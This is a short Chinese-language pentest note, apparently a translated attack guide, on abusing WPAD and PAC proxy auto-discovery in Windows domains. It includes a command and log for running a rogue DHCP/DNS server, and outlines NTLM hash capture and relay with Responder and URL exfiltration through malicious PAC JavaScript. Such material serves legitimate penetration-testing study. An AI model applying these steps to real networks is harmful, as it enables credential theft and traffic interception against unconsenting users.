[WPAD](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol) (Web Proxy Auto-Discovery)，浏览器用的，动态获取一个指示该用什么代理的文件，

文件是一个 [PAC](https://docs.microsoft.com/en-us/internet-explorer/ie11-ieak/proxy-auto-config-examples) (Proxy Auto-Config) javascript，包含FindProxyForURL 功能，在浏览器导航到网站的时候激活

```javascript
###PAC file example
function FindProxyForURL(url, host) {
    if (host == "example.com") {
        return "PROXY proxy:80";
    }
    return "DIRECT";
}
```

即便WPAD协议默认不适用，也仍然在enterprise 环境中存在，因为许多公司用代理来监控流量。WPAD可以被浏览器或系统设置甚至[GPO](https://tektab.com/2012/09/26/setting-up-web-proxy-autodiscovery-protocol-wpad-using-dns/)设置。

浏览器通常在 h ttp://wpad.<domain>/wpad.dat 找PAC，DHCP也能设置另一个url

解析wpad.<domain>的时候会系统发送一个DNS请求，之前如果DNS失败会LLMNR or NetBIOS，但 [MS16-077](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-077)过后WPAD广播就被禁止了

wpad DNS记录无法被创建因为 [Global Query Block List](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/) (GQBL) 

现在最好是配置恶意DNS服务器用DHCP或手动解析wpad 到你的机器

```powershell
###Configure a fake DNS server from DHCP
$ sudo dhcplayer server -I eth2 -v --domain contoso.local
INFO - IP pool: 192.168.100.1-192.168.100.254
INFO - Mask: 255.255.255.0
INFO - Broadcast: 192.168.100.255
INFO - DHCP: 192.168.100.44
INFO - DNS: [192.168.100.44]
INFO - Router: [192.168.100.44]
INFO - Domain: contoso.local
INFO - DISCOVER from 52:54:00:76:87:bb (ws01-10)
INFO - Offer 192.168.100.121
INFO - REQUEST from 52:54:00:76:87:bb (ws01-10)
INFO - Requested IP 192.168.100.121
INFO - ACK to 192.168.100.121 for 52:54:00:76:87:bb
```

以前似乎能在wpad请求中请求基本HTTP认证（[What is LLMNR & WPAD and How to Abuse Them During Pentest ? – Pentest Blog](https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/) ），作者实验似乎只有在NTLM 被要求时 (using responder.py)，受害者浏览器才会下载wpad文件

这一方法除了破解NTLM哈希（ [NTLM hash to crack](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-hashes-cracking)），[NTLM relay](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-relay)攻击也很有用，因为HTTP不要求sign in NTLM（登陆？），因此任何NTLM跨协议延迟攻击都能用，

向受害者提供PAC文件将允许您作为受害者执行一些javascript代码，这些代码可用于 [exfiltrate the visited URLs](https://www.blackhat.com/docs/us-16/materials/us-16-Kotler-Crippling-HTTPS-With-Unholy-PAC.pdf)

